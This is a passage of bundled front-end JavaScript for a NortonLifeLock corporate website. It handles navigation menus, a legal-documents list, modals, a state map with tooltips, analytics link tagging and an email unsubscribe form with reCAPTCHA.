        e.find(".c-nav__mobile-submenu").length < 1 && e.find(".c-nav__mobile-menu-item-expand").remove();
      });
    },
    openSubNav: function (e) {
      e.addClass("open"), e.children("a").attr("aria-expanded", !0);
    },
    closeSubNav: function (e) {
      e.removeClass("open"), e.children("a").attr("aria-expanded", !1);
    },
    countryLangRibbonText: function () {
      var e = a.getCountryLang();
      $(".c-nav__ribbon-item-countrylang").html(e), $(".c-nav__mobile-country-lang").html(e);
    },
    getCountryLang: function () {
      var e = window.location.pathname.match(/^\/([^\/]+\/[^\/]+)/);
      return e && 0 !== e[1].indexOf("content") ? e[1] : "us/en";
    }
  };
  var c = function () {
    $(".c-foot__back-to-top").off("click").on("click", function () {
      event.preventDefault(), document.body.scrollTop = 0, document.documentElement.scrollTop = 0;
    });
  };
  var s = {
    onPageLoad: function () {
      const e = s.isStorageAvailable();
      if (e && sessionStorage.getItem("legalRepo")) {
        $(".c-lrep__spinner").hide();
        const e = JSON.parse(sessionStorage.getItem("legalRepo"));
        s.buildRows(e);
      } else $.getJSON("/bin/nortonlifelock/legal").done(function (t) {
        $(".c-lrep__spinner").hide(), s.buildRows(t), e && sessionStorage.setItem("legalRepo", JSON.stringify(t));
      }).fail(function (e) {
        $(".c-lrep__spinner").hide(), console.log(e);
      });
    },
    buildRows: function (e) {
      if (document.querySelector(".c-lrep__container>template")) {
        const t = document.querySelector(".c-lrep__container>template").content.querySelector("div");
        e.forEach(function (e, o) {
          if (e.productName) {
            const n = document.importNode(t, !0);
            n.classList.add("c-lrep__row-" + o), n.querySelector(".c-lrep__product-name").textContent = e.productName, e.languages.length && e.languages.forEach(function (e) {
              const t = e.language,
                a = document.createElement("option");
              a.value = t, a.text = t, n.querySelector(".c-langdd__select").appendChild(a), e.assetType[0].forEach(function (e) {
                const a = e.assetTypeName,
                  c = document.querySelectorAll(".c-lrep__container>template")[1].content.querySelector("div");
                e.assets.forEach(function (e) {
                  const o = document.importNode(c, !0);
                  o.dataset.language = t, o.querySelector(".c-lrep__doc-title").textContent = a;
                  const s = o.querySelector(".c-lrep__doc-link");
                  s.href = e.assetPath, s.textContent = e.assetName, n.appendChild(o);
                }), document.querySelector(".c-lrep").appendChild(n), s.bindEvents.addOnSelect(o);
              });
            });
          }
        });
      }
    },
    bindEvents: {
      addOnSelect: function (e) {
        var t = $(".c-lrep__row-" + e);
        t.on("change", "select", function (e) {
          var o = e.target.options[e.target.selectedIndex].value,
            n = t.find("[data-language='".concat(o, "']"));
          t.find("[data-language]").each(function () {
            $(this).hasClass("c-lrep--hidden") || $(this).addClass("c-lrep--hidden");
          }), n.hasClass("c-lrep--hidden") && n.removeClass("c-lrep--hidden");
        });
      }
    },
    isStorageAvailable: function () {
      var e;
      try {
        e = window.sessionStorage;
        var t = "__storage_test__";
        return e.setItem(t, t), e.removeItem(t), !0;
      } catch (t) {
        return _instanceof(t, DOMException) && (22 === t.code || 1014 === t.code || "QuotaExceededError" === t.name || "NS_ERROR_DOM_QUOTA_REACHED" === t.name) && e && 0 !== e.length;
      }
    }
  };
  var r = {
    bindEvents: {
      onClick: function () {
        $(".c-csm__trigger-js").off("mousedown").on("mousedown", function (e) {
          r.openModal(e);
        }), $(".c-csm__modalbg-js").off("mousedown").on("mousedown", function (e) {
          e.target.className.includes("c-csm__modalbg-js") && r.closeModal(e);
        }), $(".c-csm__modal-exp-title-js").off("mousedown").on("mousedown", function (e) {
          var t = $(this).closest(".c-csm__modal-expander"),
            o = t.find(".c-csm__modal-exp-contents");
          t.hasClass("c-csm__modal-exp--expanded") ? r.closeExpander(t, o[0]) : r.openExpander(t, o[0]);
          var n = t.siblings(".c-csm__modal-exp--expanded");
          n.length && n.each(function (e, t) {
            var o = $(t),
              n = o.find(".c-csm__modal-exp-contents");
            r.closeExpander(o, n[0]);
          });
        });
      }
    },
    setUpExpanderHeights: function () {
      $(".c-csm__modal-exp-ul").each(function () {
        var e = this.scrollHeight;
        $(this).attr("data-height-expanded", e);
      });
    },
    accessibility: function () {
      $(".c-csm").keydown(function (e) {});
    },
    openModal: function (e) {
      e.stopPropagation(), e.preventDefault(), setTimeout(function () {
        r.setUpExpanderHeights();
      }, 300), $(".c-csm__modal").addClass("c-csm__modal--open"), $(".c-csm").parents(".cmp-container").css("position", "static"), $(".c-csm").parents(".cmp-container__body").css("position", "static"), $(".c-csm__modalbg-js, .c-csm__modal").fadeIn("fast"), $(".c-csm__trigger-js, .c-csm__modal-top").off("mousedown").on("mousedown", function (e) {
        r.closeModal(e);
      }), $(".l-container--page").addClass("u-no-scroll");
    },
    closeModal: function (e) {
      e.stopPropagation(), e.preventDefault(), $(".c-csm__modal").removeClass("c-csm__modal--open"), $(".c-csm__modalbg-js, .c-csm__modal").fadeOut("fast"), setTimeout(function () {
        $(".c-csm").parents(".cmp-container").css("position", "relative"), $(".c-csm").parents(".cmp-container__body").css("position", "relative");
      }, 300), $(".c-csm__trigger-js").off("mousedown").on("mousedown", function (e) {
        r.openModal(e);
      }), $(".l-container--page").removeClass("u-no-scroll");
    },
    openExpander: function (e, t) {
      var o = t.scrollHeight;
      t.style.height = o + "px", e.addClass("c-csm__modal-exp--expanded").attr("aria-expanded", !0);
    },
    closeExpander: function (e, t) {
      var o = t.scrollHeight,
        n = t.style.transition;
      t.style.transition = "", requestAnimationFrame(function () {
        t.style.height = o + "px", t.style.transition = n, requestAnimationFrame(function () {
          t.style.height = "0px";
        });
      }), e.removeClass("c-csm__modal-exp--expanded").attr("aria-expanded", !1);
    }
  };
  var l = {
    bindEvents: {
      onClick: function () {
        $(".c-partner-nav__close-hamburger-js").off("mousedown").on("mousedown", function (e) {
          l.openMobileNav(e);
        }), $(".c-partner-nav__mobile-menu-bg-js").off("mousedown").on("mousedown", function (e) {
          l.closeMobileNav(e);
        }), $(".c-partner-nav__mobile-menu-item-expander").off("mousedown").on("mousedown", function () {
          var e = $(this).closest(".c-partner-nav__mobile-menu-item");
          e.toggleClass("c-partner-nav__mobile-menu-item-expand--active"), e.siblings().removeClass("c-partner-nav__mobile-menu-item-expand--active");
        });
      }
    },
    accessibility: function () {
      const e = document.querySelectorAll(".c-partner-nav__desktop-menu-expander"),
        t = () => {
          e.forEach(e => {
            void 0 !== e.parentElement && e.parentElement.classList.remove("open"), e.setAttribute("aria-expanded", "false");
          });
        };
      e && e.forEach(e => {
        e.addEventListener("click", () => {
          void 0 === e.parentElement || e.parentElement.classList.contains("open") ? (void 0 !== e.parentElement && e.parentElement.classList.remove("open"), e.setAttribute("aria-expanded", "false")) : (t(), e.parentElement.classList.add("open"), e.setAttribute("aria-expanded", "true"));
        });
      });
      (() => {
        const e = document.querySelector("body");
        e && e.addEventListener("click", o => {
          const n = e.querySelector(".c-partner-nav__desktop-menu");
          n && (n.contains(o.target) || t());
        }, !1);
      })();
      (() => {
        const e = document.querySelectorAll(".c-partner-nav__lang-selector"),
          t = document.querySelectorAll(".c-partner-nav__active-lang");
        if (t) {
          const o = t[0] ? t[0].getAttribute("data-location") : "",
            n = t[0] ? t[0].querySelector(".country-flag").getAttribute("src") : "",
            a = t[0] ? t[0].querySelector(".country-short").textContent : "",
            c = {};
          c[0] = {
            location: o,
            flag: n,
            text: a
          };
          const s = e[0].querySelectorAll(".c-partner-nav__lang-options-list li");
          s.forEach((e, t) => {
            if (s) {
              const o = e ? e.getAttribute("data-location") : "",
                n = e ? e.querySelector(".country-flag").getAttribute("src") : "",
                a = e ? e.querySelector(".country-short").textContent : "";
              c[t + 1] = {
                location: o,
                flag: n,
                text: a
              };
            }
          });
          const r = (e, t, o) => {
            document.querySelectorAll(".c-partner-nav__active-lang").forEach(n => {
              const a = n.parentElement.querySelectorAll(".c-partner-nav__lang-options-list li"),
                c = n.querySelector(".country-short"),
                s = n.querySelector(".country-flag");
              c.textContent = t, n.setAttribute("data-link", o), s.setAttribute("src", e);
              for (let e = 0; e <= a.length - 1; e++) a[e].querySelector(".country-short").textContent === c.textContent && (a[0].classList.remove("hide-item"), a[e].classList.add("hide-item"));
            });
          };
          for (let e = 0; e <= Object.keys(c).length - 1; e++) {
            const t = c[e].location;
            if (window.location.toString().includes(t)) {
              r(c[e].flag, c[e].text, c[e].location);
              break;
            }
          }
          (() => {
            const e = document.querySelectorAll(".c-partner-nav__lang-option");
            if (e) {
              const t = document.querySelector(".c-partner-nav__active-lang") ? document.querySelector(".c-partner-nav__active-lang").getAttribute("data-link") : "",
                o = window.location.href;
              e.forEach(e => {
                const n = e.getAttribute("data-href") ? e.getAttribute("data-href") : "";
                e.addEventListener("click", () => {
                  const e = o.toString().replace(t, n);
                  window.location.href = e;
                });
              });
            }
          })();
        }
      })();
      const o = document.querySelectorAll(".c-partner-nav__active-lang");
      o && o.forEach(e => {
        e.addEventListener("click", () => {
          const e = document.querySelectorAll(".c-partner-nav__lang-options-list");
          e && e.forEach(e => {
            e.classList.toggle("list-open"), e.parentElement.classList.toggle("list-open"), (() => {
              const e = document.querySelector(".c-partner-nav__lang-selector"),
                t = document.querySelectorAll(".c-partner-nav__lang-selector button, .c-partner-nav__lang-selector a"),
                o = e.querySelectorAll(".c-partner-nav__lang-options-list");
              t.forEach(t => {
                t.addEventListener("focusout", t => {
                  setTimeout(() => {
                    void 0 !== e && e.classList.contains("list-open") && (e.contains(document.activeElement) || (e.classList.remove("list-open"), o.forEach(e => {
                      e.classList.remove("list-open");
                    })));
                  });
                });
              });
            })();
          });
        });
      });
    },
    openMobileNav: function (e) {
      e.stopPropagation(), e.preventDefault(), $(".c-partner-nav__mobile-menu-box").addClass("c-partner-nav__mobile--open"), $(".c-partner-nav__mobile-menu-bg-js").fadeIn("fast"), $(".c-partner-nav__close-hamburger-js").off("mousedown").attr("aria-expanded", !0).addClass("c-partner-nav__close-hamburger--x"), $(".c-partner-nav__close-hamburger-js.c-partner-nav__close-hamburger--x").off("mousedown").on("mousedown", function (e) {
        l.closeMobileNav(e);
      }), $(".l-container--page").addClass("u-no-scroll");
    },
    closeMobileNav: function (e) {
      e.stopPropagation(), e.preventDefault(), $(".c-partner-nav__mobile-menu-box").removeClass("c-partner-nav__mobile--open"), $(".c-partner-nav__mobile-menu-bg-js").fadeOut("fast"), $(".c-partner-nav__close-hamburger-js.c-partner-nav__close-hamburger--x").off("mousedown").attr("aria-expanded", !1).removeClass("c-partner-nav__close-hamburger--x"), $(".c-partner-nav__close-hamburger-js").off("mousedown").on("mousedown", function (e) {
        l.openMobileNav(e);
      }), $(".l-container--page").removeClass("u-no-scroll");
    },
    hideMobileExpanderLinks: function () {
      $(".c-partner-nav__mobile-menu-item").each(function () {
        var e = $(this);
        e.find(".c-partner-nav__mobile-submenu").length < 1 && e.find(".c-partner-nav__mobile-menu-item-expand").remove();
      });
    },
    openSubNav: function (e) {
      e.addClass("open"), e.children("a").attr("aria-expanded", !0);
    },
    closeSubNav: function (e) {
      e.removeClass("open"), e.children("a").attr("aria-expanded", !1);
    },
    updateLinkInid: () => {
      try {
        const e = "nortonlifelock_nav_",
          t = window.nortonAnalytics ? window.nortonAnalytics.page_name : "",
          o = (window.nortonAnalytics ? window.nortonAnalytics.site_sub_section : "") + t,
          n = document.querySelector(".c-partner-nav").querySelectorAll("a");
        n && n.forEach(t => {
          if (t.hasAttribute("href")) {
            let n = t.innerText.toLowerCase();
            n = n.replace(/\s/g, "-");
            const a = e + n + "_" + o;
            t.href += "?inid=" + a.toString();
          }
        });
      } catch (e) {
        console.log("error occurred while updating inid", e);
      }
    },
    stickyNavbar: () => {
      const e = document.querySelector(".c-partner-nav__bar"),
        t = document.querySelector(".c-partner-nav"),
        o = document.querySelector(".partnertopnavigation"),
        n = e.offsetTop;
      window.onscroll = () => {
        void 0 !== t && null != t && void 0 !== o && null != o && (window.pageYOffset >= n ? (t.classList.add("c-partner-nav__sticky-nav"), o.classList.add("sticky-nav-adjustments")) : (t.classList.remove("c-partner-nav__sticky-nav"), o.classList.remove("sticky-nav-adjustments")));
      };
    }
  };
  const i = e => {
      try {
        const t = e.split("?")[0],
          o = t.split("#")[0].replace(/\/$/, "");
        return o.split("/").pop().split(".")[0];
      } catch (e) {
        console.log("nlokUtil: getPageString() ::" + e);
      }
    },
    d = {
      css: {
        ctaLink: "c-hero__cta",
        modalContainer: "c-modal__container",
        hubspotCode: "hubspot-code"
      },
      dom: {
        elemCta: () => document.querySelectorAll("." + d.css.ctaLink),
        modalContainer: () => document.querySelector("." + d.css.modalContainer),
        hubspotCode: () => document.querySelector("." + d.css.hubspotCode)
      },
      appendInid: () => {
        try {
          const e = d.dom.elemCta();
          e && e.forEach(e => {
            if (window.nortonAnalytics) {
              const t = window.nortonAnalytics.page_name || "",
                o = new URL(e.href);
              let n = "";
              n = "nortonlifelock-" + t + "_hero_" + i(o.pathname), o.searchParams.set("inid", n), e.href = decodeURIComponent(o.toString().toLowerCase());
            }
          });
        } catch (e) {
          console.log("Hero: appendInid() ::" + e);
        }
      }
    };
  const m = {
    css: {
      contactsSelector: "c-contacts-selector__select",
      activeList: "selected",
      listContainer: "c-contacts-list__container"
    },
    dom: {
      contactsSelector: () => document.querySelectorAll("." + m.css.contactsSelector)
    },
    selectorSetup: () => {
      try {
        const e = m.dom.contactsSelector();
        e && e.forEach(e => {
          e.addEventListener("change", t => {
            const o = e.getAttribute("id"),
              n = document.querySelector("#lists-" + o + " ." + e.value);
            let a = document.querySelector("#lists-" + o);
            a = a.querySelectorAll("." + m.css.listContainer), a.forEach(e => {
              e.classList.remove("" + m.css.activeList);
            }), n.classList.add("" + m.css.activeList);
          });
        });
      } catch (e) {
        console.log("Contacts List: selectorSetup() ::" + e);
      }
    }
  };
  const u = {
    css: {
      pageContainer: ".l-container--page",
      shapesContainer: ".stateShapesContainer",
      stateShape: "path.stateShape",
      labelsContainer: ".stateLabelsContainer",
      tooltip: ".c-map__tooltip",
      tooltipContainer: ".c-map__tooltip__container",
      modalBg: ".c-map__modal__bg",
      modalBody: ".c-map__modal",
      modalCloseBtn: ".c-map__modal__close",
      modifier: {
        modalActive: "c-map__modal--active",
        show: "c-map--show"
      }
    },
    dom: {
      init: () => {
        u.dom.pageContainer = document.querySelector(u.css.pageContainer), u.dom.shapes = document.querySelector(u.css.shapesContainer), u.dom.stateEls = document.querySelectorAll(u.css.stateShape), u.dom.labels = document.querySelector(u.css.labelsContainer), u.dom.tooltip = document.querySelector(u.css.tooltip), u.dom.tooltipContainer = document.querySelector(u.css.tooltipContainer), u.dom.modalBg = document.querySelector(u.css.modalBg), u.dom.modalContents = document.querySelector(u.css.modalBody), u.dom.modalClosebtn = document.querySelector(u.css.modalCloseBtn);
      }
    },
    onPageLoad: function () {
      try {
        u.dom.init(), u.dom.pageContainer.before(u.dom.tooltipContainer), u.dom.stateEls.forEach(e => {
          e.hasAttribute("id") && u.addEvent(e.getAttribute("id"));
        });
      } catch (e) {
        console.log("cmap pageload: " + e);
      }
    },
    addEvent: e => {
      try {
        const t = u.dom.shapes.querySelector("#" + e),
          o = e.slice(0, 3) + "label_" + e.slice(3),
          n = document.querySelectorAll(`#${e},#${o}`);
        for (const o of n) o.addEventListener("mouseenter", function () {
          u.dom.tooltip.querySelectorAll(".c-map__tooltip__contents").forEach(function (e) {
            e.classList.remove(u.css.modifier.show);
          }), u.dom.tooltip.querySelector('.c-map__tooltip__contents[data-state="' + e + '"]').classList.add(u.css.modifier.show), u.dom.tooltip.classList.add(u.css.modifier.show), t.style.fill = u.dom.shapes.dataset.hoverColor;
        }), o.addEventListener("mouseleave", function () {
          u.dom.tooltip.classList.remove(u.css.modifier.show), t.style.fill = u.dom.shapes.dataset.fillColor;
        }), o.addEventListener("click", function () {
          t.style.fill = u.dom.shapes.dataset.hoverColor, u.modal.init(e);
        }), o.addEventListener("mousemove", function (e) {
          let t = e.pageX + 10,
            o = e.pageY + 10;
          const n = u.dom.tooltip.scrollWidth || 0,
            a = u.dom.tooltip.scrollHeight || 0;
          t = t + n + 10 > window.innerWidth ? window.innerWidth - n - 10 : t, o = o + a + 10 > window.scrollY + window.innerHeight ? window.scrollY + window.innerHeight - a - 10 : o, u.dom.tooltip.style.left = t + "px", u.dom.tooltip.style.top = o + "px";
        });
      } catch (e) {
        console.log("cmap addevent: " + e);
      }
    },
    modal: {
      events: {
        clickOpen: function () {
          "modalActive" in u.modal.shape.dataset || u.modal.open();
        },
        clickClose: function () {
          u.dom.modalBg.addEventListener("click", function (e) {
            e.target === this && u.modal.close();
          }, !1), u.dom.modalClosebtn.addEventListener("click", function () {
            u.modal.close();
          }, !1);
        },
        escapeClose: function () {
          try {
            document.body.addEventListener("keydown", function (e) {
              const t = 27 === (e.keyCode ? e.keyCode : e.which),
                o = u.dom.modalBg.classList.contains(u.css.modifier.modalActive);
              t && o && u.modal.close();
            }, !1);
          } catch (e) {
            console.log("cmap modal escapeclose: " + e);
          }
        }
      },
      open: function () {
        try {
          u.dom.modalBg.classList.add(u.css.modifier.modalActive), u.modal.shape.setAttribute("aria-expanded", "true"), u.modal.shape.dataset.modalActive = "true", u.dom.modalContents.querySelectorAll("[data-state]").forEach(function (e) {
            e.dataset.state === u.modal.id ? e.classList.add(u.css.modifier.show) : e.classList.remove(u.css.modifier.show);
          }), document.body.classList.add("u-no-scroll");
        } catch (e) {
          console.log("cmap modal open: " + e);
        }
      },
      close: function () {
        try {
          delete u.modal.shape.dataset.modalActive, u.dom.modalBg.classList.remove(u.css.modifier.modalActive), u.modal.shape.setAttribute("aria-expanded", "false"), document.body.classList.remove("u-no-scroll");
        } catch (e) {
          console.log("cmap modal close: " + e);
        }
      },
      init: function (e) {
        try {
          u.modal.shape = u.dom.shapes.querySelector("#" + e), u.modal.id = e, u.modal.events.clickOpen(), u.modal.events.clickClose(), u.modal.events.escapeClose();
        } catch (e) {
          console.log("cmap modal init: " + e);
        }
      }
    }
  };
  const p = {
    css: {
      main: "t-input-txt"
    },
    dom: {
      elemAllInput: e => e.querySelectorAll(`.${p.css.main}__text`)
    },
    init: e => {
      p.dom.elemAllInput(e).forEach(e => {
        const t = p.css.main + "__label-up";
        e.addEventListener("change", e => {
          const o = e.currentTarget.parentElement.querySelector("label");
          e.currentTarget.value ? o.classList.add(t) : o.classList.remove(t);
        }), e.addEventListener("focus", e => {
          e.currentTarget.parentElement.querySelector("label").classList.add(t);
        }), e.addEventListener("focusout", e => {
          if (!e.currentTarget.value) {
            e.currentTarget.parentElement.querySelector("label").classList.remove(t);
          }
        });
      });
    }
  };
  const _ = {
    css: {
      submitButton: "c-eus__email-btn",
      emailInput: "c-eus__email-form input",
      inputError: "t-input-txt__error",
      emailForm: "c-eus__email-form",
      loader: "c-eus__loader",
      wrapper: "c-eus__wrapper",
      disabledButton: "c-btn--disabled",
      hide: "c-eus--hide",
      errorButton: "c-eus__err-btn",
      emailContainer: "c-eus__unsubscribe-container"
    },
    dom: {
      templateEmailContainer: () => document.getElementById("emailContainerTemplate"),
      templateEmailSubmitError: () => document.getElementById("submissionErrorTemplate"),
      templateEmailOptoutError: () => document.getElementById("optoutErrorTemplate"),
      templateEmailSubmitSuccess: () => document.getElementById("submissionSuccessTemplate"),
      templateEmailOptoutSuccess: () => document.getElementById("optoutSuccessTemplate"),
      templateSubmitTimeoutError: () => document.getElementById("submitTimeoutError"),
      templateValidateTimeoutError: () => document.getElementById("validateTimeoutError"),
      elemSubmitButton: () => document.querySelector("." + _.css.submitButton),
      elemEmailForm: () => document.querySelector("." + _.css.emailForm),
      elemInput: () => document.querySelector("." + _.css.emailInput),
      elemLoader: () => document.querySelector("." + _.css.loader),
      elemWrapper: () => document.querySelector("." + _.css.wrapper),
      elemErrButton: () => document.querySelector("." + _.css.errorButton),
      elemEmailContainer: () => document.querySelector("." + _.css.emailContainer)
    },
    emailInit: () => {
      const e = new URL(window.location.href).searchParams;
      let t;
      if (e.has("UUID") && (t = e.get("UUID")), t) _.callToColp(t);else {
        const e = _.dom.templateEmailContainer();
        _.replaceContent(e.innerHTML), nortonAnalytics.page_name = "unsubscribe", _.trackPageView(), _.setupValidation();
      }
    },
    setupValidation: () => {
      const e = _.dom.elemInput(),
        t = _.dom.elemEmailForm();
      var o;
      o = _.dom.elemEmailForm(), p.init(o);
      try {
        e.addEventListener("blur", () => {
          _.verifyEmailAndRecaptcha();
        }), t.addEventListener("submit", e => {
          e.preventDefault(), _.callToColp();
        });
      } catch (e) {
        console.log("Email Unsubscribe: setupValidation() ::" + e);
      }
    },
    replaceContent: e => {
      _.dom.elemWrapper().innerHTML = e;
    },
    callToColp: e => {
      const t = _.dom.elemLoader();
      t.classList.remove("" + _.css.hide);
      const o = _.dom.templateEmailSubmitError(),
        n = _.dom.templateEmailSubmitSuccess(),
        a = _.dom.templateSubmitTimeoutError(),
        c = _.dom.templateEmailOptoutSuccess(),
        s = _.dom.templateEmailOptoutError(),
        r = _.dom.templateValidateTimeoutError();
      let l, i, d;
      e || (d = _.dom.elemInput().value);
      let m = window.location.pathname.split("/")[1].toUpperCase();
      if (m.includes("CONTENT") && (m = window.location.pathname.split("/")[3].toUpperCase()), !e) if (d && m) {
        l = _.dom.elemSubmitButton().getAttribute("data-ct");
        const e = new XMLHttpRequest();
        e.addEventListener("load", () => {
          try {
            200 === e.status ? (t.classList.add("" + _.css.hide), _.replaceContent(n.innerHTML), nortonAnalytics.page_name = "verify email", _.trackPageView()) : (t.classList.add("" + _.css.hide), _.replaceContent(o.innerHTML), nortonAnalytics.page_name = "failure could not send", _.trackPageView(), _.reloadPage());
          } catch (e) {
            console.log("Email unsubscribe: callToColp() ::" + e), t.classList.add("" + _.css.hide), _.replaceContent(o.innerHTML), nortonAnalytics.page_name = "failure could not send", _.trackPageView(), _.reloadPage();
          }
        }), i = encodeURIComponent(d), e.open("POST", "/bin/nortonlifelock/optout", !0), e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"), e.timeout = 1e4, e.send("email=" + i + "&country=" + m + "&g-recaptcha-response=" + l), e.ontimeout = () => {
          console.log("colp: api timeout after " + e.timeout + "ms"), t.classList.add("" + _.css.hide), _.replaceContent(a.innerHTML), nortonAnalytics.page_name = "failure submission timeout", _.trackPageView(), _.reloadPage();
        };
      } else t.classList.add("" + _.css.hide), _.replaceContent(o.innerHTML), nortonAnalytics.page_name = "failure could not send", _.trackPageView(), _.reloadPage();
      if (e) {
        const o = new XMLHttpRequest();
        o.addEventListener("load", () => {
          try {
            204 === o.status ? (t.classList.add("" + _.css.hide), _.replaceContent(c.innerHTML), nortonAnalytics.page_name = "success", _.trackPageView()) : (t.classList.add("" + _.css.hide), _.replaceContent(s.innerHTML), nortonAnalytics.page_name = "failure over 24h", _.trackPageView(), _.reloadPage());
          } catch (e) {
            console.log("Email unsubscribe: callToColp() ::" + e), t.classList.add("" + _.css.hide), _.replaceContent(s.innerHTML), nortonAnalytics.page_name = "failure over 24h", _.trackPageView(), _.reloadPage();
          }
        }), o.open("GET", "/bin/nortonlifelock/optout?UUID=" + e), o.timeout = 1e4, o.send(), o.ontimeout = () => {
          console.log("colp: api timeout after " + o.timeout + "ms"), t.classList.add("" + _.css.hide), _.replaceContent(r.innerHTML), nortonAnalytics.page_name = "failure opt-out timeout", _.trackPageView(), _.reloadPage();
        };
      }
    },
    verifyEmailAndRecaptcha: () => {
      const e = _.dom.elemInput(),
        t = _.dom.elemSubmitButton();
      try {
        _.isEmailValid(e.value) ? e.parentElement.classList.remove("" + _.css.inputError) : e.parentElement.classList.add("" + _.css.inputError), _.isEmailValid(e.value) && null != t.dataset.ct ? (t.classList.remove("" + _.css.disabledButton), t.disabled = !1) : (t.classList.add("" + _.css.disabledButton), t.disabled = !0);
      } catch (e) {
        console.log("Email Unsubscribe: verifyEmailAndRecaptcha() ::" + e);
      }
    },
    isEmailValid: e => e.length && e.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/),
    reloadPage: () => {
      const e = _.dom.elemErrButton();
      e && e.addEventListener("click", e => {
        e.preventDefault(), window.location.reload();
      });
    },
    addRecaptcha: () => {
      const e = _.dom.elemEmailContainer();
      if (e) {
        const t = e.getAttribute("data-recaptcha-lang"),
          o = document.createElement("script");
        o.src = "https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit&hl=" + t, o.async = !0, o.defer = !0, document.getElementById("c-eus__recaptcha-api").appendChild(o);
      }
    },
    trackPageView: () => {
      window.s ? window.s.trackPageView(nortonAnalytics) : setTimeout(() => {
        _.trackPageView();
      }, 100);
    },
    spaSetup: () => {
      Object.defineProperty(window.nortonAnalytics, "spa", {
        value: "true"
      });
    }
  };
  $(document).ready(function () {
    !function () {
      if ($(".c-blog__container").length) {
        var e = $(".c-blog__container").data("filter");
        e && n.callAPI(e);
      }
    }(), $(".c-nav").length && (a.getTicker(), a.countryLangRibbonText(), a.bindEvents.onClick(), a.hideMobileExpanderLinks(), a.accessibility()), c(), s.onPageLoad(), $(".c-csm").length && r.bindEvents.onClick(), $(".c-partner-nav").length && (l.bindEvents.onClick(), l.hideMobileExpanderLinks(), l.accessibility(), l.stickyNavbar(), l.updateLinkInid()), d.appendInid(), document.querySelector(".c-contacts-list") && m.selectorSetup(), document.querySelector(".c-map") && u.onPageLoad(), $(".c-eus").length && (_.spaSetup(), _.emailInit(), _.addRecaptcha());
  });
}]);